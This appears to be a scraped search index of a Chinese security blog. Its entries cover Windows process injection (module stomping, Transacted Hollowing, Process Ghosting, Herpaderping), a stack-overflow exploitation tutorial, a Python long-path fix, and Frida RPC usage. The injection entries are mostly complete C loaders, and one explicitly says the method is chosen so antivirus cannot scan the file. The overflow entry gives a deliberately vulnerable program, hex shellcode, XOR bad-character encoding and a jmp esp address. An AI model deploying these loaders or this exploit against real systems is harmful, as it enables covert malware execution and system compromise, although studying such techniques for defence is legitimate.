EntryPoint in memory LPVOID dllEntryPointMem = (LPVOID)(dllEntryPoint + (DWORD_PTR)hModule); wprintf(L\"[+] DllEntryPoint in memory: %p\\n\", dllEntryPointMem); return dllEntryPointMem; } BOOL ModuleStomp(unsigned char buf[], SIZE_T payloadSize, DWORD pid) { HANDLE hProcess = INVALID_HANDLE_VALUE; HANDLE hTargetModule = NULL; // module to load #ifdef _WIN64 LPCSTR targetLibrary = \"C:\\\\temp\\\\modules\\\\64\\\\filemgmt.dll\"; #else //LPCSTR targetLibrary = \"C:\\\\temp\\\\modules\\\\86\\\\filemgmt.dll\"; LPCSTR targetLibrary = \"C:/Windows/SysWOW64/filemgmt.dll\"; #endif LPVOID memBase; HMODULE moduleBase; LPVOID entryPoint = { 0 }; wprintf(L\"[+] Opening the target process, pid: %d\\n\", pid); // Open the target process with PID hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); if (hProcess == INVALID_HANDLE_VALUE) { perror(\"[-] Couldn't find the target process\\n\"); exit(-1); } size_t targetSize = lstrlenA(targetLibrary); // Allocate memory in the target process memBase = VirtualAllocEx(hProcess, NULL, targetSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (memBase == 0) { printf(\"%d\\n\", GetLastError()); perror(\"[-] Failed to allocate memory in target process\\n\"); exit(-1); } wprintf(L\"[+] Memory allocated at remote process address: %p\\n\", memBase); // Writing target library path to the newly allocated memory in target process if (!WriteProcessMemory(hProcess, memBase, targetLibrary, targetSize, NULL)) { perror(\"[-] Failed to write module in target process memory\\n\"); exit(-1); } wprintf(L\"[+] DLL path written to the allocated memory\\n\"); // Getting Address to the LoadLibraryA and converting it to the Thread routine LPTHREAD_START_ROUTINE LoadModule = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA(\"kernel32.dll\"), \"LoadLibraryA\"); if (LoadModule == NULL) { perror(\"[-] Couldn't find the module LoadLibraryA\\n\"); exit(-1); } // Creating remote thread // This will load our target module in the target process hTargetModule = CreateRemoteThread(hProcess, NULL, 0, LoadModule, memBase, 0, NULL); if (hTargetModule == INVALID_HANDLE_VALUE) { perror(\"[-] Failed to load mo","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:10:0","tags":["Windows"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"Transacted Hollowing 原理: 利用NtCreateTransaction创建事务. 利用CreateFileTransacted以事务特性打开一个文件. 利用WriteFile向上述打开的文件写入恶意代码payload. 利用NtCreateSection根据上述文件内容创建一个section. 利用NtRollbackTransaction回滚之前的写操作. 利用CreateProcess创建一个挂起的目标进程. 利用NtMapViewOfSection将恶意代码的section映射到目标进程中,可以得到一个映射的地址sectionBaseAddress. 利用WriteProcessMemory以及ResumeThread执行恶意代码. 代码: #include \u003cWindows.h\u003e #include \u003cstdio.h\u003e #include \"CWLInc.h\" #include \u003ciostream\u003e BYTE* GetPayloadBuffer(OUT size_t\u0026 p_size) { HANDLE hFile = CreateFileW(L\"C:/Users/XiaLuoHun/Desktop/LuoDst/x64/Release/LuoDst.exe\", GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0); if (hFile == INVALID_HANDLE_VALUE) { perror(\"[-] Unable to open payload file... \\n\"); exit(-1); } p_size = GetFileSize(hFile, 0); BYTE* bufferAddress = (BYTE*)VirtualAlloc(0, p_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (bufferAddress == NULL) { perror(\"[-] Failed to allocated memory for payload buffer... \\n\"); exit(-1); } DWORD bytesRead = 0; if (!ReadFile(hFile, bufferAddress, p_size, \u0026bytesRead, NULL)) { perror(\"[-] Failed to read payload buffer... \\n\"); exit(-1); } return bufferAddress; } HANDLE MakeSectionWithTransaction(BYTE* payload, DWORD payloadSize) { HANDLE hTransaction; HANDLE hTransactedFile = INVALID_HANDLE_VALUE; HANDLE hSection; NTSTATUS status; DWORD bytesWritten; // Function Declaration HMODULE hNtdllModule = GetModuleHandleA(\"ntdll.dll\"); if (hNtdllModule == INVALID_HANDLE_VALUE) { perror(\"[-] Cannot found module ntdll.dll \\n\"); exit(-1); } _NtCreateTransaction pNtCreateTransaction = (_NtCreateTransaction)GetProcAddress(hNtdllModule, \"NtCreateTransaction\"); if (pNtCreateTransaction == NULL) { perror(\"[-] Cannot found API NtCreateTransaction \\n\"); exit(-1); } _NtCreateSection pNtCreateSection = (_NtCreateSection)GetProcAddress(hNtdllModule, \"NtCreateSection\"); if (pNtCreateSection == NULL) { perror(\"[-] Cannot found API NtCreateSection \\n\"); exit(-1); } _NtRollbackTransaction pNtRollbackTransaction = (_NtRollbackTransaction)GetProcAddress(hNtdllModule, \"NtRollbackTransaction\"); if (pNtRollbackTransaction == NULL) { perror(\"[-] Cannot found API NtRollbackTransaction \\n\"); exit(-1); } // Create NTFS Transaction object _OBJECT_ATTRIBUTES objAttr; InitializeObjectAttributes(\u0026objAttr, NULL, 0, NULL, NULL); status = pNtCreateTransaction(\u0026hTransaction, TRANSACTION_ALL_ACCESS, \u0026objAttr, NULL, NULL, 0, 0, 0, NULL, NULL); if (!NT_SUCCESS(status)) { perror(\"[-] Error Creating Transaction Object!!\\n\"); exit(-1); } wprintf(L\"[+] NTFS Transaction Object Created\\n\"); // open target file for transaction wchar_t targetPath[MAX_PATH]; lstrcpyW(targetPath, L\"C:\\\\temp\\\\mynotes.txt\"); hTransactedFile = CreateFileTransactedW(targetPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL,NULL, hTransaction, NULL, NULL); if (hTransactedFile == INVALID_HANDLE_VALUE) { perror(\"[-] Error Opening Target File For Transaction..\\n\"); exit(-1); } // Write payload to transacted file if (!WriteFile(hTransactedFile, payload, payloadSize, \u0026bytesWritten, NULL)) { perror(\"[-] Error writing payload into transaction!!\\n\"); exit(-1); } wprintf(L\"[+] Payload Written To The Transacted File \\n\"); // Create Section from transacted file status = pNtCreateSection(\u0026hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hTransactedFile); if (!NT_SUCCESS(status)) { perror(\"[-] Failed To Create Section From Transacted File..\\n\"); exit(-1); } wprintf(L\"[+] Section Created From Transaction \\n\"); CloseHandle(hTransactedFile); hTransactedFile = INVALID_HANDLE_VALUE; // Rollback the transaction status = pNtRollbackTransaction(hTransaction, TRUE); if (!NT_SUCCESS(status)) { perror(\"[-] Failed To Rollback Transaction\"); exit(-1); } wprintf(L\"[+] Transaction Rolled back..\\n\"); CloseHandle(hTransaction); hTransaction = INVALID_HANDLE_VALUE; return hSection; } HANDLE CreateSuspendedProcess(PROCESS_INFORMATION \u0026pi) { LPSTARTUPINFO sInfo = new STARTUPINFO(); sInfo-\u003ecb = sizeof(STARTUPINFOW); HANDLE hTargetProcess = INVALID_HAN","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:11:0","tags":["Windows"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"Process Ghosting 原理: 该方法与Process Doppelganging从实现上几乎一样,唯一的区别就是处理不落地文件的方式: Process Doppelganging: 通过事务API打开文件,修改文件(写入payload),创建section,再回滚修改的内容. Process Ghosting: 打开文件,设置删除标志,修改文件(写入payload),创建section,删除文件.这样进程运行时,反病毒软件打不开文件,因此无法做检测. 代码: #include \u003cstdio.h\u003e #include \u003cWindows.h\u003e #include \"CWLInc.h\" #include \u003ciostream\u003e BYTE* GetPayloadBuffer(OUT size_t\u0026 p_size) { HANDLE hFile = CreateFileW(L\"C:/Users/XiaLuoHun/Desktop/LuoDst/x64/Release/LuoDst.exe\", GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0); if (hFile == INVALID_HANDLE_VALUE) { perror(\"[-] Unable to open payload file... \\n\"); exit(-1); } p_size = GetFileSize(hFile, 0); BYTE* bufferAddress = (BYTE*)VirtualAlloc(0, p_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (bufferAddress == NULL) { perror(\"[-] Failed to allocated memory for payload buffer... \\n\"); exit(-1); } DWORD bytesRead = 0; if (!ReadFile(hFile, bufferAddress, p_size, \u0026bytesRead, NULL)) { perror(\"[-] Failed to read payload buffer... \\n\"); exit(-1); } CloseHandle(hFile); return bufferAddress; } HANDLE MakeSectionFromDeletePendingFile(wchar_t* ntFilePath, BYTE* payload, size_t payloadSize) { HANDLE hFile; HANDLE hSection; NTSTATUS status; _OBJECT_ATTRIBUTES objAttr; UNICODE_STRING uFileName; IO_STATUS_BLOCK statusBlock = {0}; DWORD bytesWritten; // NT Functions Declaration _NtOpenFile pNtOpenFile = (_NtOpenFile)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtOpenFile\"); if (pNtOpenFile == NULL) { perror(\"[-] Unable To Found API NtOpenFile...\\n\"); exit(-1); } _RtlInitUnicodeString pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"RtlInitUnicodeString\"); if (pRtlInitUnicodeString == NULL) { perror(\"[-] Unable To Found API RtlInitUnicodeString...\\n\"); exit(-1); } _NtSetInformationFile pNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtSetInformationFile\"); if (pNtSetInformationFile == NULL) { perror(\"[-] Unable To Found API NtSetInfromationFile...\\n\"); exit(-1); } _NtCreateSection pNtCreateSection = (_NtCreateSection)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtCreateSection\"); if (pNtCreateSection == NULL) { perror(\"[-] Unable To Found API NtCreateSection.. \\n\"); exit(-1); } pRtlInitUnicodeString(\u0026uFileName, ntFilePath); InitializeObjectAttributes(\u0026objAttr, \u0026uFileName, OBJ_CASE_INSENSITIVE, NULL, NULL); wprintf(L\"[+] Opening The File...\\n\"); // Open File // FLAGS: // FILE_SUPERSEDED: deletes the old file and creates new one if file exists // FILE_SYNCHRONOUS_IO_NONALERT: All operations on the file are performed synchronously status = pNtOpenFile(\u0026hFile, GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE, \u0026objAttr, \u0026statusBlock, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_SUPERSEDED | FILE_SYNCHRONOUS_IO_NONALERT); if (!NT_SUCCESS(status)) { perror(\"[-] Error Opening File...\\n\"); exit(-1); } wprintf(L\"[+] Putting File Into Delete-Pending State...\\n\"); // Set disposition flag FILE_DISPOSITION_INFORMATION info = { 0 }; info.DeleteFile = TRUE; // Set delete-pending state to the file // FileDispositionInformation: Request to delete the file when it is closed status = pNtSetInformationFile(hFile, \u0026statusBlock, \u0026info, sizeof(info), FileDispositionInformation); if (!NT_SUCCESS(status)) { perror(\"[-] Error setting file to delete pending state...\\n\"); exit(-1); } wprintf(L\"[+] Writing Payload Into Delete-Pending State File...\\n\"); // Write Payload To File // Since we've set our file to delete-pending state // as soon as we close the handle the file will disappear if (!WriteFile(hFile, payload, payloadSize, \u0026bytesWritten, NULL)) { perror(\"[-] Failed to write payload to the file...\\n\"); exit(-1); } wprintf(L\"[+] Creating Section From Delete-Pending State File...\\n\"); // Before closing the handle we create a section from delete-pending file // This will later become the file-less section // once we close the handle to the delete-pending file status = pNtCreateSection(\u0026hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:12:0","tags":["Windows"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"Herpaderping 原理: 利用CreateFile创建一个临时文件. 利用WriteFile将恶意代码payload写到上述的临时文件中. 利用NtCreateSection根据上述文件创建一个section. 利用NtCreateProcessEx根据上述section创建一个进程. 利用WriteFile修改磁盘上的临时文件内容. 利用RtlCreateProcessParametersEx创建一个进程环境变量块. 利用NtAllocateVirtualMemory,NtWriteVirtualMemory将上述进程环境变量块写入上方创建的进程中. 利用WriteProcessMemory修改上述进程的进程环境变量块. 利用NtCreateThreadEx在上述进程的入口点创建一个线程,运行恶意代码. 代码: #include \u003cWindows.h\u003e #include \u003cstdio.h\u003e #include \"CWLInc.h\" BYTE* GetPayloadBuffer(OUT size_t\u0026 p_size) { HANDLE hFile = CreateFileW(L\"C:/Users/XiaLuoHun/Desktop/Advanced-Process-Injection-Workshop-master/payloads/payload64.exe\", GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); if (hFile == INVALID_HANDLE_VALUE) { perror(\"[-] Unable to open payload file... \\n\"); } p_size = GetFileSize(hFile, NULL); BYTE* bufferAddress = (BYTE*)VirtualAlloc(0, p_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (bufferAddress == NULL) { perror(\"[-] Failed to allocate memory for payload buffer.. \\n\"); exit(-1); } DWORD bytesRead = 0; if (!ReadFile(hFile, bufferAddress, p_size, \u0026bytesRead, NULL)) { perror(\"[-] Failed to read payload buffer... \\n\"); exit(-1); } CloseHandle(hFile); return bufferAddress; } ULONG_PTR GetEntryPoint(HANDLE hProcess, BYTE* payload,PROCESS_BASIC_INFORMATION pbi) { // Functions Declaration _RtlImageNtHeader pRtlImageNtHeader = (_RtlImageNtHeader)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"RtlImageNtHeader\"); if (pRtlImageNtHeader == NULL) { perror(\"[-] Couldn't found API RtlImageNTHeader...\\n\"); exit(-1); } _NtReadVirtualMemory pNtReadVirtualMemory = (_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtReadVirtualMemory\"); if (pNtReadVirtualMemory == NULL) { perror(\"[-] Couldn't found API NtReadVirtualMemory...\\n\"); exit(-1); } // Retrieving entrypoint of our payload BYTE image[0x1000]; ULONG_PTR entryPoint; SIZE_T bytesRead; NTSTATUS status; ZeroMemory(image, sizeof(image)); status = pNtReadVirtualMemory(hProcess, pbi.PebBaseAddress, \u0026image, sizeof(image), \u0026bytesRead); if (!NT_SUCCESS(status)) { perror(\"[-] Error reading process base address..\\n\"); exit(-1); } wprintf(L\"[+] Base Address of target process PEB: %p \\n\", (ULONG_PTR)((PPEB)image)-\u003eImageBaseAddress); entryPoint = (pRtlImageNtHeader(payload)-\u003eOptionalHeader.AddressOfEntryPoint); entryPoint += (ULONG_PTR)((PPEB)image)-\u003eImageBaseAddress; wprintf(L\"[+] EntryPoint of the payload buffer: %p \\n\", entryPoint); return entryPoint; } BOOL Herpaderping(BYTE* payload,size_t payloadSize) { // Functions Declartion _NtCreateSection pNtCreateSection = (_NtCreateSection)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtCreateSection\"); if (pNtCreateSection == NULL) { perror(\"[-] Couldn't find API NtCreateSection...\\n\"); exit(-1); } _NtCreateProcessEx pNtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtCreateProcessEx\"); if (pNtCreateProcessEx == NULL) { perror(\"[-] Couldn't find API NtCreateProcessEx...\\n\"); exit(-1); } _NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtQueryInformationProcess\"); if (pNtQueryInformationProcess == NULL) { perror(\"[-] Couldn't find API NtQueryInformationProcess...\\n\"); exit(-1); } _NtCreateThreadEx pNtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtCreateThreadEx\"); if (pNtCreateThreadEx == NULL) { perror(\"[-] Couldn't find API NtCreateThreadEx\\n\"); exit(-1); } _RtlCreateProcessParametersEx pRtlCreateProcessParametersEx = (_RtlCreateProcessParametersEx)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"RtlCreateProcessParametersEx\"); if (pRtlCreateProcessParametersEx == NULL) { perror(\"[-] Couldn't find API RtlCreateProcessParametersEx\\n\"); exit(-1); } _RtlInitUnicodeString pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"RtlInitUnicodeString\"); if (pRtlInitUnicodeString == NULL) { perror(\"[-] Couldn't find API RtlInitUnicodeString \\n\"); exit(-1); } _NtWri","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:13:0","tags":["Windows"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["Win相关"],"content":"参考链接 加强版远程线程注入 如何禁用软件DLL劫持 一种通用DLL劫持技术研究 常见进程注入的实现及内存dump分析——Process Hollowing（冷注入) x64下动态加载EXE文件到内存执行遇到的问题 0xc0000005 Process-Hollowing 高级进程注入总结 Windows进程注入技术研究 ","date":"2022-03-24","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/:14:0","tags":["Windows"],"title":"Windows进程注入技术","uri":"/posts/windows%E7%9B%B8%E5%85%B3/windows%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"},{"categories":["那些年遇过的坑"],"content":"现象 Python在Windows上处理长路径时,会出现下列错误. ","date":"2022-03-23","objectID":"/posts/%E9%82%A3%E4%BA%9B%E5%B9%B4%E9%81%87%E8%BF%87%E7%9A%84%E5%9D%91/python%E4%B9%8Bfilenotfounderror/:1:0","tags":["Python"],"title":"Python之FileNotFoundError","uri":"/posts/%E9%82%A3%E4%BA%9B%E5%B9%B4%E9%81%87%E8%BF%87%E7%9A%84%E5%9D%91/python%E4%B9%8Bfilenotfounderror/"},{"categories":["那些年遇过的坑"],"content":"解决方案 将HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\FileSystem中的LongPathsEnabled值修改为1. ","date":"2022-03-23","objectID":"/posts/%E9%82%A3%E4%BA%9B%E5%B9%B4%E9%81%87%E8%BF%87%E7%9A%84%E5%9D%91/python%E4%B9%8Bfilenotfounderror/:2:0","tags":["Python"],"title":"Python之FileNotFoundError","uri":"/posts/%E9%82%A3%E4%BA%9B%E5%B9%B4%E9%81%87%E8%BF%87%E7%9A%84%E5%9D%91/python%E4%B9%8Bfilenotfounderror/"},{"categories":["漏洞相关"],"content":"栈结构 寄存器环境 局部变量 调用方栈 返回地址 参数 ","date":"2022-02-22","objectID":"/posts/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/:1:0","tags":["栈溢出"],"title":"栈溢出原理与实践","uri":"/posts/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/"},{"categories":["漏洞相关"],"content":"实验环境 编译器 VS2022 编译选项 1、属性-\u003eC/C++-\u003e常规-\u003eSDL检查(否 (/sdl-)). 2、属性-\u003eC/C++-\u003e代码生成-\u003e安全检查(禁用安全检查 (/GS-)). 3、属性-\u003e链接器-\u003e高级-\u003e随机基址(否 (/DYNAMICBASE:NO)) 4、属性-\u003e链接器-\u003e高级-\u003e数据执行保护(DEP)(否 (/NXCOMPAT:NO)) build版本 x86 Release ","date":"2022-02-22","objectID":"/posts/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/:2:0","tags":["栈溢出"],"title":"栈溢出原理与实践","uri":"/posts/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/"},{"categories":["漏洞相关"],"content":"实验例子 #include \u003cstdio.h\u003e #include \u003cwindows.H\u003e int main(int argc, char* argv[]) { char szBuf[8]; FILE* fp = NULL; fp = fopen(\"pwd.txt\", \"r+\"); fscanf(fp, \"%s\", szBuf); if (strcmp(szBuf, \"Hello\") == 0) { printf(\"ok\\r\\n\"); } else { printf(\"error\\r\\n\"); } fclose(fp); return 0; } ","date":"2022-02-22","objectID":"/posts/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/:3:0","tags":["栈溢出"],"title":"栈溢出原理与实践","uri":"/posts/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/"},{"categories":["漏洞相关"],"content":"漏洞利用 上述代码中fscanf没有长度检查,所以会造成栈溢出,可以被我们利用. ","date":"2022-02-22","objectID":"/posts/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/:4:0","tags":["栈溢出"],"title":"栈溢出原理与实践","uri":"/posts/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/"},{"categories":["漏洞相关"],"content":"修改函数返回地址 我们在x64Dbg中定位到fscanf函数. 现在我们想让Main函数执行完后,在返回地址的下个单元即0x19FF34这个地方执行我们的代码,我们需要构造下fscanf读的文件内容. ","date":"2022-02-22","objectID":"/posts/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/:4:1","tags":["栈溢出"],"title":"栈溢出原理与实践","uri":"/posts/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/"},{"categories":["漏洞相关"],"content":"执行我们自己的代码 现在我们来让这个程序弹个MessageBox. 改善环境,增大我们写代码的空间 72 00 6C 6C 6F 00 00 00 74 FF 19 00 34 FF 19 00 8B DC 81 EC 00 02 00 00 8D 43 F0 50 50 B8 A0 7B E2 76 FF D0 8D 5C 24 08 53 68 1C 21 40 00 50 B8 50 10 40 00 FF D0 FF E3 我们在r文件中填写内容 上面开辟的空间就是r文件的大小,0x200字节. 弹MessageBox的话,我们通过GetProcAddr(hUser32,“MessageBoxA”)拿函数地址,但hUser32需要通过LoadLibraryA(“user32.dll”)得到.又LoadLibraryA这个函数需要通过GetProcAddr(hKernel32,“LoadLibraryA”)拿函数地址,但hKernel32需要通过LoadLibraryA(“kernel32.dll”)得到,这就陷入了一个循环.但我们可以通过teb结构得到Kernel32的句柄. GetKernelBase proc assume fs : nothing mov eax, fs:[18h] mov eax, [eax + 30h] ;指向PEB结构 mov eax, [eax + 0ch] ;指向LDR Ptr32 _PEB_LDR_DATA mov eax, [eax + 0ch] ;指向InLoadOrderModuleList _LIST_ENTRY mov eax, [eax] ;移动_LIST_ENTRY mov eax, [eax] ;指向Kernel32 mov eax, [eax + 18h] ;指向DllBase ret GetKernelBase endp 在r文件中准备函数和字符串. 558BEC5653578B750803763C8D76788B360375088B450C250000FFFF0BC075168B450C2B46103B4614766D33C05F5B5EC9C20800EB628B450C8B5E20035D0833C9EB388B3C8B037D085157568BF7B000B9FFFFFFFFF2AEF7D18BFE8B750CF3A68A46FF3A47FF750433C0EB051BC0D1E0405E5F590BC07502EB06413B4E1872C33B4E18720933C05F5B5EC9C208008B5E24035D080FB7044B8B5E1C035D088B04830BC0750933C05F5B5EC9C208000345085F5B5EC9C2080064A1180000008B40308B400C8B400C8B008B008B4018C3904C6F61644C69627261727941004D657373616765426F78410048656C6C6F576F726C6421007573657233322E646C6C00 但是这里有个问题,fscanf遇到特定字符就会截断,如0d,0a,0c,0b,20这样的内容,我们需要做个工具,对这些内容进行加密,加密后不允许出现上述字符,如异或加密,我们需要找个一个异或值,使其我们的内容异或后没有敏感字符. 获取异或值. 异或加密. 用Winhex将r文件中的函数和字符串用此异或值进行加密. 开始写代码. 注意:我们写的代码二进制中不能有敏感字符. 8D B3 00 01 00 00 B9 00 01 00 00 80 74 31 FF 85 E2 F9 8D 83 B8 01 00 00 FF D0 8D 8B D0 01 00 00 51 50 8D 83 00 01 00 00 FF D0 8D 8B F5 01 00 00 51 FF D0 8D 8B DD 01 00 00 51 50 8D 83 00 01 00 00 FF D0 6A 00 8D 8B F5 01 00 00 51 8D 8B E9 01 00 00 51 6A 00 FF D0 E8 A0 88 A6 76 将上述二进制数据存到r文件开始即可. 成果展示. 注意 如果换个电脑环境,上述程序就运行不起来了,因为我们写了绝对地址. 其中调用方栈位置的数据我们可以随便填,返回地址的地方我们可以找一个跳板地址,里面指令是FFE4(jmp esp),或者是其他的如jmp eax等,这样的话,我们就可以缓解环境问题. 通用跳板:0x7FFA4512(里面指令是FFE4(jmp esp),Win2000,Xp,Win10均可使用. ","date":"2022-02-22","objectID":"/posts/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/:4:2","tags":["栈溢出"],"title":"栈溢出原理与实践","uri":"/posts/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/"},{"categories":["Android Frida"],"content":"Frida RPC开发姿势 Frida是一款基于Python和JavaScript的进程级Hook框架,其中JavaScript语言承担了Hook函数的主要工作,而Python语言则相当于一个提供给外界的绑定接口,使用者可以通过Python语言将JavaScript脚本注入进程中.官方也在下方仓库中提供了通过Python远程外部调用JavaScript中函数的方式. https://github.com/frida/frida-python 下面简单介绍下通过Python实现Frida注入的基本方式. ","date":"2022-02-21","objectID":"/posts/android/android-hook/frida/frida%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E4%B8%8Erpc/:1:0","tags":["Frida"],"title":"Frida主动调用与RPC","uri":"/posts/android/android-hook/frida/frida%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E4%B8%8Erpc/"},{"categories":["Android Frida"],"content":"获取设备 import frida # 无线连接 # /data/local/tmp/frida-server -l 0.0.0.0:6666 # Wifi ADB监听IP和端口为192.168.2.111:5555 device = frida.get_device_manager().add_remote_device(\"192.168.2.111:6666\") # 有线连接 device = frida.get_usb_device() ","date":"2022-02-21","objectID":"/posts/android/android-hook/frida/frida%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E4%B8%8Erpc/:1:1","tags":["Frida"],"title":"Frida主动调用与RPC","uri":"/posts/android/android-hook/frida/frida%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E4%B8%8Erpc/"},{"categories":["Android Frida"],"content":"注入进程 import frida import time # spawn方式注入进程 pid = device.spawn(['com.example.luodemo']) device.resume(pid) time.sleep(1) session = device.attach(pid) # attach模式注入进程 session = device.attach('com.example.luodemo') ","date":"2022-02-21","objectID":"/posts/android/android-hook/frida/frida%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E4%B8%8Erpc/:1:2","tags":["Frida"],"title":"Frida主动调用与RPC","uri":"/posts/android/android-hook/frida/frida%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E4%B8%8Erpc/"},{"categories":["Android Frida"],"content":"注入脚本 import frida script = session.create_script(''' setImmediate(Java.perform(function(){ console.log('hello python frida') })) ''') #读入Hook脚本内容 script.load() #将脚本加载进进程空间中 ","date":"2022-02-21","objectID":"/posts/android/android-hook/frida/frida%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E4%B8%8Erpc/:1:3","tags":["Frida"],"title":"Frida主动调用与RPC","uri":"/posts/android/android-hook/frida/frida%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E4%B8%8Erpc/"},{"categories":["Android Frida"],"content":"文件方式注入进程 with open(\"LuoHook.js\", encoding=\"UTF-8\") as f: script = session.create_script(f.read()) script.load() 